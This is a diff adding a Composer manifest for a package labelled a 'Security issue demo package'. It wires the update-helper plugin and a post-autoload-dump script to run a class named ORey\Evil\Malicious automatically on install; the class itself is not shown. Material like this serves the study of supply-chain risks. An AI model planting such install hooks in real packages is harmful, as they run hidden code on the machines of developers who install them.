@@ -1,0 +1,26 @@
+{
+    "name": "o-rey/legs",
+    "type": "package",
+    "description": "Security issue demo package",
+    "license": "MIT",
+    "require": {
+        "kylekatarnls/update-helper": "^1"
+    },
+    "extra": {
+        "update-helper": "ORey\\Evil\\Malicious"
+    },
+    "scripts": {
+        "post-autoload-dump":
+        "UpdateHelper\\UpdateHelper::check"
+    },
+    "autoload": {
+        "psr-4": {
+            "ORey\\Evil\\": "src"
+        }
+    },
+    "config": {
+        "allow-plugins": {
+            "kylekatarnls/update-helper": true
+        }
+    }
+}
